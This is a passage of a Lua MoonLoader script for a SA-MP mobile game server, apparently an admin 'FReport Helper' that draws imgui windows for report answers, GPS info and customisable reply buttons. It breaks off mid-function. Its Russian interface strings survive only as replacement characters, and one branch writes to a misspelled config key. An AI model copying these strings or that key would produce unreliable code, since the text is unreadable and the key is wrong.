		backokno.v = false
		nextokno.v = false
		statew2.v = false
		statew4.v = false
		statew5.v = false
		statew9.v = false
		statew6.v = false
		statew7.v = false
		statew.v = false
		end
		if smn.v == false and smndva.v == false then
		smn.v = true 
		end 
		
		imgui.CenterTextColoredRGB("��������� �� {ffdead}"..nick_report.." {ffffff}[{ffdead}"..id_report.."{ffffff}]")
		   imgui.TextWrapped(u8''..u8(text_report))
		
		imgui.Separator()
		imgui.TextColoredRGB('������� ��������������� /mn ')
		imgui.SameLine()
		if imgui.Checkbox(u8"", smn) then
    sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��������������� /mn {32CD32}���������� {ffffff}�� ������� �����.', 0xffdead)

	--sampAddChatMessage('{f44f36}[A] Taras_Kachmar [48] ���� � ��������� �������������� Kraim_Ferreira.', -1)
	--sampAddChatMessage('{f44f36}[A] Taras_Kachmar [48] ���� � ��������� �������������� Kraim_Ferreira.', -1)
	
	--sampAddChatMessage('{f44f36}������������� Taras_Kachmar [48] ������������ Nik_Everyone [56] �� 30 ����. �������: ����', -1)
		--shtukadva.v = false
		
		smndva.v = false
    end
	imgui.SameLine()
	imgui.CenterTextColoredRGB('|')
	imgui.SameLine()
	if imgui.Checkbox(u8"������. ��������������� /mn", smndva) then
         --  sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��������������� /mn {32CD32}���������� {ffffff}�� ������������ �����.', 0xffdead)
		    sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}� ����������.', 0xffdead)
			--`shtuka.v = false
			smn.v = false
		
    end
		if imgui.CollapsingHeader(u8"[1] ���������� ���������") then
    	
		imgui.Separator()
		
		
    	end
    	if imgui.CollapsingHeader(u8"[2] ���������") then
    	imgui.Separator()
    	end
    	if imgui.CollapsingHeader(u8"[3] ���������") then
		if imgui.CollapsingHeader(u8"[1] ��������� ��������") then
		imgui.TextColoredRGB('[1] �������� ������')
		imgui.TextColoredRGB('[2] ���-���')
		imgui.TextColoredRGB('[3] Google Authenticator')
		imgui.TextColoredRGB('[4] �������� ���')
		end
    	if imgui.CollapsingHeader(u8"[2] ��������� ���������") then
		imgui.TextColoredRGB('[1] ���������� ������')
		imgui.TextColoredRGB('[2] �c���������� ����')
		imgui.TextColoredRGB('[3] ��������������� ������������ �������������')
		imgui.TextColoredRGB('[4] ��������������� ������������� ��������')
		imgui.TextColoredRGB('[5] ����-������ � ��')
		imgui.TextColoredRGB('[6] �������������� RolePlay ���������')
		imgui.TextColoredRGB('[7] ����� ���������')
		end
		if imgui.CollapsingHeader(u8"[3] ��������� ����������� � �������") then
		imgui.TextColoredRGB('[1] Damage Informer')
		imgui.TextColoredRGB('[2] ���������, ����� � �.�')
		imgui.TextColoredRGB('[3] ����� ����������')
		imgui.TextColoredRGB('[4] ��������� ��������')
		imgui.TextColoredRGB('[5] ��������� ����������� ����')
		imgui.TextColoredRGB('[6] ��������� ��������')
		imgui.TextColoredRGB('[7] ����������� �������� �����')
		imgui.TextColoredRGB('[8] ����������� �������� ����������')
		imgui.TextColoredRGB('[9] ��������� �������')
		imgui.TextColoredRGB('[10] ����������� ����� ����')
		imgui.TextColoredRGB('[11] ����������� ����������/�������� �� �������')
		end
		imgui.TextColoredRGB('	   [4] �������')
		if imgui.CollapsingHeader(u8"[5] ��������� ����") then
		imgui.TextColoredRGB('[1] �������� ���')
		imgui.TextColoredRGB('[2] ����������: ��������/���������')
		imgui.TextColoredRGB('[3] ������� ���: ��������/���������')
		imgui.TextColoredRGB('[4] �������� �������������: ��������/���������')
		imgui.TextColoredRGB('[5] VIP ���: ��������/���������')
		imgui.TextColoredRGB('[6] ����������� ���: ��������/���������')
		imgui.TextColoredRGB('[7] �������� ���: ��������/���������')
		end
		imgui.Separator()
    	end
    	if imgui.CollapsingHeader(u8"[4] ������ �� ����") then
    		imgui.TextColoredRGB('[1] ��� �� ����� SA-MP Mobile?')
			imgui.TextColoredRGB('[2] ��� ����� Flin Mobile � � ��� ��� �����?')
			imgui.TextColoredRGB('[3] F.A.Q')
			imgui.TextColoredRGB('[4] ��� ����� RolePLay � � ��� ��� ����?')
			imgui.TextColoredRGB('[5] ������� � �������')
			imgui.TextColoredRGB('[6] ������ ����� ������������ ������� Flin Mobile?')
			imgui.TextColoredRGB('[7] ��� ��������� ������ ���� � ������ ������?')
			imgui.TextColoredRGB('[8] ��� �������� ������ � ����?')
			imgui.TextColoredRGB('[9] �������� ������� � ������������ �����')
			imgui.TextColoredRGB('[10] ��� ����� ������ � ������?')
			imgui.TextColoredRGB('[11] ����������� �� �������')
			imgui.TextColoredRGB('[12] �������������� ������')
			imgui.TextColoredRGB('[13] �������� ������')
			imgui.TextColoredRGB('[14] �������')
			imgui.TextColoredRGB('[15] �����')
			imgui.TextColoredRGB('[16] ���������� ����')
			imgui.TextColoredRGB('[17] ���������� �����')
			imgui.TextColoredRGB('[18] ���������� ���')
			imgui.TextColoredRGB('[19] ������� �����')
			imgui.TextColoredRGB('[20] ����� �����')
			imgui.TextColoredRGB('[21] Battle Pass')
			imgui.TextColoredRGB('[22] ���������� ���������')
			imgui.TextColoredRGB('[23] ���������� �������')
			imgui.TextColoredRGB('[24] �����')
			imgui.Separator()
    	end
    	if imgui.CollapsingHeader(u8"[5] ������� �������") then
    		imgui.TextColoredRGB('[1] ����� �������')
			imgui.TextColoredRGB('[2] ������� �������')
			imgui.TextColoredRGB('[3] ������� ����������')
			imgui.TextColoredRGB('[4] ������� ����')
			imgui.TextColoredRGB('[5] ������� �������')
			imgui.TextColoredRGB('[6] ������� ������ ����� � ������������ ��������')
			imgui.TextColoredRGB('[7] ������� �� ������')
			imgui.TextColoredRGB('[8] ������� ������� � ������������')
			imgui.TextColoredRGB('[9] ������� �����')
			imgui.TextColoredRGB('[10] ������� �������')
			imgui.Separator()
    	end
		if imgui.CollapsingHeader(u8"[6] ����� � ��������������") then
    		imgui.TextColoredRGB('[1] ������ �������������')
			imgui.TextColoredRGB('[2] ������ ����������')
			imgui.Separator()
    	end
    	if imgui.CollapsingHeader(u8"[7] ������") then
    		
			imgui.Separator()
    	end
    	
		if imgui.CollapsingHeader(u8"[8] ���������") then
    		imgui.TextColoredRGB('[1] �������������: �������/�� �������')
			imgui.TextColoredRGB('[2] �������: �������/�� �������')
			imgui.TextColoredRGB('[3] �������: �������/�� �������')
			imgui.TextColoredRGB('[4] ����������')
			imgui.Separator()
    	end
		if imgui.CollapsingHeader(u8"[9] �������������") then
    		imgui.TextColoredRGB('[1] ������������')
			imgui.TextColoredRGB('[2] ����� ������')
			imgui.Separator()
    	end
		if imgui.CollapsingHeader(u8"[10] ������ �����-���") then
    		imgui.Separator()
    	end
    	if imgui.CollapsingHeader(u8"[11] ��������") then
    		imgui.Separator()
    	end
    	if imgui.CollapsingHeader(u8"[12] �������, ���������� � �������") then
    		imgui.TextColoredRGB('[1] ��������� �������')
			imgui.TextColoredRGB('[2] ���������� �������')
			imgui.TextColoredRGB('[3] ����������� �������')
			imgui.TextColoredRGB('[4] ����������')
			imgui.TextColoredRGB('[5] ���������� � ��������� ��������')
			imgui.TextColoredRGB('[6] ���������� � ���������� � ����������� ��������')
			imgui.TextColoredRGB('[7] ���������� � �����������')
			imgui.TextColoredRGB('[8] ���������� �������')
			imgui.TextColoredRGB('[9] ���������� �������')
			imgui.Separator()
    	end
    if	imgui.CollapsingHeader(u8"[13] Battle Pass") then
		imgui.Separator()
		end
    if	imgui.CollapsingHeader(u8"[14] �����") then
		imgui.Separator()
		
		end
    	if imgui.CollapsingHeader(u8"[15] �������") then
			imgui.Separator()
		end
    	 if imgui.CollapsingHeader(u8"[16] �����") then 
		 imgui.Separator()
		 
		 end
	if 	imgui.CollapsingHeader(u8"[17] ������� �������") then
	imgui.Separator()
	end
		imgui.Separator()
		imgui.NewLine()
	if imgui.Button(u8"����� �� ���������������� /mn", imgui.ImVec2(-1, 25)) then
		main_window_state.v = true
        
        	mn.v = false
end
imgui.NewLine()
imgui.Separator()
imgui.NewLine()
		imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022')
    	imgui.End()
    
end

function otdelgps()
imgui.SetNextWindowSize(imgui.ImVec2(290, 464), imgui.Cond.FirstUseEver)
    	 imgui.SetNextWindowPos(imgui.ImVec2(main_x / 2, main_y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(-0.9, 0.5))
    	imgui.Begin(u8"GPS ���������", _, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoMove + imgui.WindowFlags.NoBringToFrontOnFocus+ imgui.WindowFlags.NoSavedSettings)
    
		if shtuka.v == false and shtukadva.v == false then
		shtuka.v = true 
		end
		imgui.TextColoredRGB('������� GPS    ')
		imgui.SameLine()
		if imgui.Checkbox(u8"", shtuka) then
    sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��������������� GPS {32CD32}���������� {ffffff}�� ������� �����.', 0xffdead)
		--shtukadva.v = false
		
		shtukadva.v = false
    end
	imgui.SameLine()
	imgui.CenterTextColoredRGB('|')
	imgui.SameLine()
	if imgui.Checkbox(u8"���������. GPS", shtukadva) then
         --  sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��������������� GPS {32CD32}���������� {ffffff}�� ������������ �����.', 0xffdead)
		    sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}� ����������.', 0xffdead)
			--`shtuka.v = false
			shtuka.v = false
		
    end
		if imgui.CollapsingHeader(u8"[1] ������������ �����") then
    		imgui.Text(u8(gps1))
    	end
    	if imgui.CollapsingHeader(u8"[2] �������������� ������") then
    		imgui.Text(u8(gps2))
    	end
    	if imgui.CollapsingHeader(u8"[3] �������� ������") then
    		imgui.Text(u8(gps3))
    	end
    	if imgui.CollapsingHeader(u8"[4] �������") then
    		imgui.Text(u8(gps4))
    	end
    	if imgui.CollapsingHeader(u8"[5] ��� �������") then
    		imgui.Text(u8(gps5))
    	end
		if imgui.CollapsingHeader(u8"[6] ����������") then
    		imgui.Text(u8(gps6))
    	end
    	if imgui.CollapsingHeader(u8"[7] �������") then
    		imgui.Text(u8(gps7))
    	end
    	
		if imgui.CollapsingHeader(u8"[8] ������ �����") then
    		imgui.Text(u8(gps9))
    	end
		if imgui.CollapsingHeader(u8"[9] ������������ ��������") then
    		imgui.Text(u8(gps10))
    	end
		if imgui.CollapsingHeader(u8"[10] �������������") then
    		imgui.Text(u8(gpsdalnoboy))
    	end
    	if imgui.CollapsingHeader(u8"[11] ���������") then
    		imgui.Text(u8(gps11))
    	end
    	if imgui.CollapsingHeader(u8"[12] �����������") then
    		imgui.Text(u8(gps13))
    	end
    	imgui.CollapsingHeader(u8"[13] �������")
    	imgui.CollapsingHeader(u8"[14] �����")
    	if imgui.CollapsingHeader(u8"[15] ������") then
			imgui.Text(u8(gps14))
		end
    	imgui.CollapsingHeader(u8"[16] ��������� ��������")
		imgui.CollapsingHeader(u8"[17] ��������� �������")
	--	imgui.NewLine()
	imgui.Separator()
		imgui.CenterTextColoredRGB('{FFA500}S U P {ffdead}� {FFA500}2022')
    	imgui.End()
    
end

function otdelizmena()
	imgui.ShowCursor = true
 imgui.SetNextWindowSize(imgui.ImVec2(800, 528), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowPos(imgui.ImVec2(main_x / 2, main_y / 2), imgui.Cond.FirstUseEver, imgui.ImVec2(0.5, 0.5))
        imgui.Begin(u8"�������� �������� ������ | �������� �����", _, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize  + imgui.WindowFlags.NoBringToFrontOnFocus+ imgui.WindowFlags.NoSavedSettings)
		imgui.PushFont(fsClock) imgui.CenterTextColoredRGB('{ffdead}����� ���������') imgui.PopFont()
		imgui.Separator()
		imgui.BeginChild("izmena", imgui.ImVec2(0, 430), true)
		imgui.CenterTextColoredRGB('������  {ffdead}�1{ffffff}: ')
		imgui.SetCursorPosX(140)

	if imgui.Button(cfg.settings.pervayaknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.pervayatext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.pervayatext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##odinknop', text_buffer_odinknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##odintext', text_buffer_odintext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#1 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_odinknop.v == '' then 
cfg.settings.pervayaknopka = u8"�1 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.pervayaknopka = text_buffer_odinknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.pervayaknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#1 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_odintext.v == '' then 
cfg.settings.pervayatext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.pervayatext = text_buffer_odintext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.pervayatext), 0xffdead)
	end
	end
	imgui.Separator()
	--------
	imgui.CenterTextColoredRGB('������  {ffdead}�2{ffffff}: ')
		imgui.SetCursorPosX(140)

	if imgui.Button(cfg.settings.dvaknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.dvatext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.dvatext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##dvaknop', text_buffer_dvaknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##dvatext', text_buffer_dvatext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#2 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_dvaknop.v == '' then 
cfg.settings.dvaknopka = u8"�2 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else
	cfg.settings.dvaknopka = text_buffer_dvaknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.dvaknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#2 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_dvatext.v == '' then 
cfg.settings.dvatext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.dvatext = text_buffer_dvatext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.dvatext), 0xffdead)
	end
	end
	------
	imgui.Separator()
	imgui.CenterTextColoredRGB('������  {ffdead}�3{ffffff}: ')
		imgui.SetCursorPosX(140)

	if imgui.Button(cfg.settings.triknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.tritext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.tritext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##triknop', text_buffer_triknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##tritext', text_buffer_tritext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#3 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_triknop.v == '' then 
cfg.settings.triknopka = u8"�3 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.triknopka = text_buffer_triknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.triknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#3 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_tritext.v == '' then 
cfg.settings.tritext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.tritext = text_buffer_tritext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.tritext), 0xffdead)
	end
	end
	imgui.Separator()
	--------
	imgui.CenterTextColoredRGB('������  {ffdead}�4{ffffff}: ')
		imgui.SetCursorPosX(140)

	if imgui.Button(cfg.settings.chetiriknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.chetiritext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.chetiritext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##chetiriknop', text_buffer_chetiriknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##chetiritext', text_buffer_chetiritext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#4 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_chetiriknop.v == '' then 
cfg.settings.chetiriknopka = u8"�4 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.chetiriknopka = text_buffer_chetiriknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.chetiriknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#4 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_chetiritext.v == '' then 
cfg.settings.chetiriext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.chetiritext = text_buffer_chetiritext.v
	inicfg.save(cfg, cfgConfig)
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.chetiritext), 0xffdead)
	end
	end
	imgui.Separator()
	---------
	imgui.CenterTextColoredRGB('������  {ffdead}�5{ffffff}: ')
		imgui.SetCursorPosX(140)

	if imgui.Button(cfg.settings.pyatknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.pyattext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.pyattext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##pyatknop', text_buffer_pyatknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##pyattext', text_buffer_pyattext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#5 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_pyatknop.v == '' then 
cfg.settings.pyatknopka = u8"�5 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.pyatknopka = text_buffer_pyatknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.pyatknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#5 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_pyattext.v == '' then 
cfg.settings.pyattext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.pyattext = text_buffer_pyattext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.pyattext), 0xffdead)
	end
	end
	imgui.Separator()
	
	--
	
	
	--
	imgui.CenterTextColoredRGB('������  {ffdead}�6{ffffff}: ')
		imgui.SetCursorPosX(140)
	if imgui.Button(cfg.settings.shestknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.shesttext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.shesttext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##shestknop', text_buffer_shestknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##shesttext', text_buffer_shesttext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#6 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_shestknop.v == '' then 
cfg.settings.shestknopka = u8"�6 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.shestknopka = text_buffer_shestknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.shestknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#6 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_shesttext.v == '' then 
cfg.settings.shesttext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.shesttext = text_buffer_shesttext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.shesttext), 0xffdead)
	end
	end
	imgui.Separator()
	--
	imgui.CenterTextColoredRGB('������  {ffdead}�7{ffffff}: ')
		imgui.SetCursorPosX(140)
	if imgui.Button(cfg.settings.semknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.semtext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.semtext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##semknop', text_buffer_semknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##semtext', text_buffer_semtext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#7 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_semknop.v == '' then 
cfg.settings.semknopka = u8"�7 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.semknopka = text_buffer_semknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.semknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	if imgui.Button(u8'#7 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_semtext.v == '' then 
cfg.settings.semtext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.semtext = text_buffer_semtext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.semtext), 0xffdead)
	end
	end
	
	imgui.Separator()
	--
	 	imgui.CenterTextColoredRGB('������  {ffdead}�8{ffffff}: ')
		imgui.SetCursorPosX(140)
	if imgui.Button(cfg.settings.vosemknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.vosemtext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
